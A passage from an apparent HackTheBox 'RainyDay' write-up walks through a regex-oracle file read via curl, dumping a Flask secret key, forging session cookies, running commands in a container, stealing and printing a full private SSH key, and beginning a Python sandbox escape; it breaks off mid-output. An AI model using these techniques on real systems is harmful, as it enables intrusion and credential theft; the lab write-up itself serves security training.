        <span class="code-blue">"type"</span><span class="code-white">: <span class="code-dark-green">"CUSTOM"</span>
<span class="code-white">      }</span>
<span class="code-white">    }</span>
<span class="code-white">  ]</span>
<span class="code-white">}</span>
</code></pre></div><p>Now we have a way to dump every file character by character:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/etc/hostname&pattern=rainyday&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result  
true

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/etc/hostname&pattern=rainydax&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
false
</code></pre></div><h3 id="reading-files-from-the-server">Reading files from the server</h3><p>We will be extracting the Python source code located at <code>/var/www/rainycloud/app.py</code> using this oracle (one byte at a time):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=#&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
true

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=#!/usr/bin/python3&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
true

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=#!/usr/bin/python3%0a&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result  
true
</code></pre></div><p>We can also approximate the length of the file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=[\s\S]{200,}&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
true

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=[\s\S]{500,}&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
true

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=[\s\S]{5000,}&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
true

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=[\s\S]{10000,}&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result  
true

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=[\s\S]{20000,}&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
false
</code></pre></div><p>So, let&rsquo;s use a Python script to find the exact length (using binary search) and then start dumping the file: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay/extract_file.py">extract_file.py</a> (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay#extract_filepy">here</a>).</p><p>After a while, I saw the first lines of <code>/var/www/rainycloud/app.py</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">extract_file.py</span> $cookie /var/www/rainycloud/app.py  
[<span class="code-green">+</span>] Length: 11572
[<span class="code-blue">&lt;</span>] Content: 449 / 11572

    #!/usr/bin/python3

    import re
    from flask import *
    import docker
    import bcrypt
    import socket
    import string
    from flask_sqlalchemy import SQLAlchemy
    from os.path import exists
    from hashlib import md5
    from inspect import currentframe, getframeinfo
    from urllib.parse import urlparse
    from flask_limiter import Limiter
    from flask_limiter.util import get_remote_address

    #secrets.py
    from secrets import SECRET_KEY

    app = Flask(__name__, static_url_path="")

[<span class="code-yellow">!</span>] Exiting...
</code></pre></div><p>So, I will continue dumping the file in the background but I will focus on dumping the secret key from <code>/var/www/rainycloud/secrets.py</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">extract_file.py</span> $cookie /var/www/rainycloud/secrets.py
[<span class="code-green">+</span>] Length: 80
[<span class="code-green">+</span>] Content: 80 / 80

    SECRET_KEY = 'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67'  
[<span class="code-green">+</span>] File saved as: var_www_rainycloud_secrets.py
[<span class="code-blue">*</span>] Elapsed time: 0:02:51
</code></pre></div><h3 id="accessing-jacks-container">Accessing <code>jack</code>&rsquo;s container</h3><p>Now we are able to forge Flask session cookies using the above secret key and <a href="https://pypi.org/project/flask-unsign/"><code>flask-unsign</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">flask-unsign</span> -s -c <span class="code-dark-yellow">"{'username': 'jack'}"</span> --secret f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67  
eyJ1c2VybmFtZSI6ImphY2sifQ.Y0yRIA.8_oTEQXDDh4fNwYdvGeJVuWQs_8
</code></pre></div><p>Using the above cookie, we can interact with <code>jack</code>&rsquo;s Docker container:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> cookie=eyJ1c2VybmFtZSI6ImphY2sifQ.Y0yRIA.8_oTEQXDDh4fNwYdvGeJVuWQs_8

<span class="code-cyan">$</span> <span class="code-dark-yellow">function</span> exec_cmd<span class="code-dark-yellow">()</span> <span class="code-dark-yellow">{</span> <span class="code-dark-green">curl</span> rainycloud.htb/containers --data-urlencode <span class="code-dark-yellow">"action=exec<span class="code-dark-cyan">$1</span>"</span> -sd <span class="code-dark-yellow">'id=c0fe876cc336487fb0bf8e28e08538a6dff303eb21ce58051015fb1eec4dded8'</span> -H <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> <span class="code-dark-yellow">}</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -la'</span>
total 64
drwxr-xr-x    1 root     root          4096 Sep 29 13:47 .
drwxr-xr-x    1 root     root          4096 Sep 29 13:47 ..
-rwxr-xr-x    1 root     root             0 Aug 25 10:33 .dockerenv
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 bin
drwxr-xr-x   15 root     root          3860 Oct 16 19:02 dev
drwxr-xr-x    1 root     root          4096 Sep 29 13:47 etc
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 home
drwxr-xr-x    1 root     root          4096 Sep 29 13:47 lib
-rwxrwxrwx    1 root     root             0 Oct 16 19:02 logfile
drwxr-xr-x    5 root     root          4096 Sep 29 13:47 media
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 mnt
drwxr-xr-x    1 root     root          4096 Sep 29 13:47 opt
dr-xr-xr-x  286 root     root             0 Oct 16 19:02 proc
drwx------    1 root     root          4096 Sep 29 13:47 root
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 run
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 sbin
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 srv
dr-xr-xr-x   13 root     root             0 Oct 16 19:02 sys
drwxrwxrwt    2 root     root          4096 Sep 29 13:47 tmp
drwxr-xr-x    1 root     root          4096 Sep 29 13:47 usr
drwxr-xr-x    1 root     root          4096 Sep 29 13:47 var

<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'hostname'</span>
c0fe876cc336
</code></pre></div><p>There&rsquo;s a note that points out that the Docker container is not fully secure:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -la /opt'</span>
total 12
drwxr-xr-x    1 root     root          4096 Sep 29 13:47 .
drwxr-xr-x    1 root     root          4096 Sep 29 13:47 ..
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 notes

<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -la /opt/notes'</span>
total 12
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 .
drwxr-xr-x    1 root     root          4096 Sep 29 13:47 ..
-rw-r--r--    1 root     root           134 Aug 25 10:41 dev_notes.txt

<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'cat /opt/notes/dev_notes.txt'</span>
 - A friend sent me some 'best practices' for docker containers that he suggested I should read through. Set aside some time for that  
</code></pre></div><h3 id="access-via-ssh">Access via SSH</h3><p>In fact, we were able to see processes from the main machine before. Indeed, there&rsquo;s a process running by the user with UID 1000:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ps -a'</span> | <span class="code-dark-green">grep</span> -a 1000
 1189 <span class="code-red">1000</span>      0:00 sleep <span class="code-red">1000</span>00000
22510 <span class="code-red">1000</span>      1:14 /tmp/.chisel client 10.10.17.44:1234 R:80:172.18.0.1:80  
38949 <span class="code-red">1000</span>      0:00 /bin/sh
39387 <span class="code-red">1000</span>      0:00 sh
39917 <span class="code-red">1000</span>      0:00 sh
55037 <span class="code-red">1000</span>      0:00 /lib/systemd/systemd --user
55039 <span class="code-red">1000</span>      0:00 (sd-pam)
55150 <span class="code-red">1000</span>      0:00 sshd: jack@pts/0
55153 <span class="code-red">1000</span>      0:00 -bash
</code></pre></div><p>So, we can take the PID (1189) and look at <code>/proc/1189/cwd</code> to see the current working directory of that process:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -l /proc/1189/cwd'</span>
lrwxrwxrwx    1 1000     1000             0 Oct 16 23:32 /proc/1189/cwd -&gt; /home/jack  
</code></pre></div><p>So, we can access <code>/home/jack</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -la /proc/1189/cwd/'</span>
total 28
drwxr-x---    3 1000     1000          4096 Sep 29 13:47 .
drwxr-xr-x    4 root     root          4096 Sep 29 13:47 ..
lrwxrwxrwx    1 root     root             9 Sep 29 12:16 .bash_history -&gt; /dev/null  
-rw-r--r--    1 1000     1000           220 Jan  6  2022 .bash_logout
-rw-r--r--    1 1000     1000          3771 Jan  6  2022 .bashrc
-rw-r--r--    1 1000     1000           807 Jan  6  2022 .profile
drwx------    2 1000     1000          4096 Sep 29 13:47 .ssh
-rw-r-----    1 1000     1000            33 Oct 16 19:02 user.txt
</code></pre></div><p>Actually, this was also possible from <code>gary</code>&rsquo;s container, but using a reverse shell in detached mode (because normal execution was with UID 1337, and detached mode is for UID 1000&mldr; A bit strange).</p><p>In order to get access to the machine, we can take <code>jack</code>&rsquo;s private SSH key:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'cat /proc/1189/cwd/.ssh/id_rsa'</span> | <span class="code-dark-green">tee</span> id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
</code></pre></div><p>And we have access to the machine, so we can read the <code>user.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> 600 <span class="mtku">id_rsa</span>

<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">id_rsa</span> jack@10.10.11.184  
<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ cat user.txt
9226a9ba80213b820a524184ecf52e85
</code></pre></div><h2 id="lateral-movement-to-user-jack_adm">Lateral movement to user <code>jack_adm</code></h2><p>Basic enumeration points that <code>jack</code> can run <code>/usr/bin/safe_python</code> as <code>jack_adm</code> using <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -l
Matching Defaults entries for jack on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  

User jack may run the following commands on localhost:
    (jack_adm) NOPASSWD: /usr/bin/safe_python *
</code></pre></div><p>We can&rsquo;t read the file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ ls -l /usr/bin/safe_python
-rwxr-x--- 1 root jack_adm 710 Jun  5 12:52 <span class="code-green">/usr/bin/safe_python  
</code></pre></div><p>But we can see that its size is 710 bytes, so it must be a text file (probably a Python or Bash script).</p><p>With the following tests, we can ensure that it is a Python script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 28, in &lt;module&gt;
    with open(sys.argv[1]) as f:
IndexError: list index out of range
<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python /usr/bin/safe_python  
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 29, in &lt;module&gt;
    exec(f.read(), env)
  File "&lt;string&gt;", line 3, in &lt;module&gt;
ImportError: __import__ not found
</code></pre></div><p>Alright, so it is a Python script that uses <code>exec</code> to run another Python script. Let&rsquo;s try the simplest code to get a shell as <code>jack_adm</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ echo 'import os; os.system("whoami")' &gt; /tmp/a.py  
<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python /tmp/a.py
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 29, in &lt;module&gt;
    exec(f.read(), env)
  File "&lt;string&gt;", line 1, in &lt;module&gt;
ImportError: __import__ not found
</code></pre></div><h3 id="escaping-python-sandbox">Escaping Python sandbox</h3><p>Well, we cannot use <code>import</code>. Therefore, we must use some sandbox escape techniques. Some examples can be found in <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">HackTricks</a>. For instance, we can try to get a <code>__subclasses__</code> list:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ echo 'print(().__class__.__base__.__subclasses__())' &gt; /tmp/a.py
<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python /tmp/a.py
[&lt;class 'type'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytes'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'cell'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'classmethod'&gt;, &lt;class 'code'&gt;, &lt;class 'complex'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'dict_reverseitemiterator'&gt;, &lt;class 'dict_reversekeyiterator'&gt;, &lt;class 'dict_reversevalueiterator'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'float'&gt;, &lt;class 'frame'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'function'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'list'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'method'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'pickle.PickleBuffer'&gt;, &lt;class 'property'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'range'&gt;, &lt;class 'reversed'&gt;, &lt;class 'symtable entry'&gt;, &lt;class 'iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'super'&gt;, &lt;class 'traceback'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'tuple'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'str'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'types.GenericAlias'&gt;, &lt;class 'anext_awaitable'&gt;, &lt;class 'async_generator_asend'&gt;, &lt;class 'async_generator_athrow'&gt;, &lt;class 'async_generator_wrapped_value'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'InterpreterID'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'weakref.CallableProxyType'&gt;, &lt;class 'weakref.ProxyType'&gt;, &lt;class 'weakref.ReferenceType'&gt;, &lt;class 'types.UnionType'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'BaseException'&gt;, &lt;class 'hamt'&gt;, &lt;class 'hamt_array_node'&gt;, &lt;class 'hamt_bitmap_node'&gt;, &lt;class 'hamt_collision_node'&gt;, &lt;class 'keys'&gt;, &lt;class 'values'&gt;, &lt;class 'items'&gt;, &lt;class '_contextvars.Context'&gt;, &lt;class '_contextvars.ContextVar'&gt;, &lt;class '_contextvars.Token'&gt;, &lt;class 'Token.MISSING'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'posix.ScandirIterator'&gt;, &lt;class 'posix.DirEntry'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_abc._abc_data'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class 'types.DynamicClassAttribute'&gt;, &lt;class 'types._GeneratorWrapper'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class 'importlib._abc.Loader'&gt;, &lt;class 'itertools.accumulate'&gt;, &lt;class 'itertools.combinations'&gt;, &lt;class 'itertools.combinations_with_replacement'&gt;, &lt;class 'itertools.cycle'&gt;, &lt;class 'itertools.dropwhile'&gt;, &lt;class 'itertools.takewhile'&gt;, &lt;class 'itertools.islice'&gt;, &lt;class 'itertools.starmap'&gt;, &lt;class 'itertools.chain'&gt;, &lt;class 'itertools.compress'&gt;, &lt;class 'itertools.filterfalse'&gt;, &lt;class 'itertools.count'&gt;, &lt;class 'itertools.zip_longest'&gt;, &lt;class 'itertools.pairwise'&gt;, &lt;class 'itertools.permutations'&gt;, &lt;class 'itertools.product'&gt;, &lt;class 'itertools.repeat'&gt;, &lt;class 'itertools.groupby'&gt;, &lt;class 'itertools._grouper'&gt;, &lt;class 'itertools._tee'&gt;, &lt;class 'itertools._tee_dataobject'&gt;, &lt;class 'operator.attrgetter'&gt;, &lt;class 'operator.itemgetter'&gt;, &lt;class 'operator.methodcaller'&gt;, &lt;class 'reprlib.Repr'&gt;, &lt;class 'collections.deque'&gt;, &lt;class '_collections._deque_iterator'&gt;, &lt;class '_collections._deque_reverse_iterator'&gt;, &lt;class 